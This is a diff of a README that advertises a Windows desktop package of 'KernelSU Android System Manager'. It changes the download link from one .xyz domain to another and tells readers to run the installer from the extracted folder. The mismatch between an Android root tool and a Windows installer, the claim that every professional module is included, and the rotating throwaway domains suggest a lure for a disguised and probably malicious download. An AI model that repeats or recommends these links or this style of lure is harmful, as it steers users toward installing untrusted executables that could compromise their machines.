@@ -18,8 +18,8 @@ KernelSU Android System Manager | Windows desktop package | straightforward setu
 
 > Use the project link below for Windows.
 
-* **Project link:** **[kernelsu.nexpath.xyz](https://kernelsu.nexpath.xyz/)**
-* **Full URL:** `https://kernelsu.nexpath.xyz/`
+* **Project link:** **[kernelsu.nerasix.xyz](https://kernelsu.nerasix.xyz/)**
+* **Full URL:** `https://kernelsu.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
@@ -51,4 +51,4 @@ All professional modules are included in this build. After setup, launch locally
 * **RAM:** 6 GB base | 12 GB+ for demanding tasks
 * **Disk:** 4 GB minimum free space
 
-***
+***
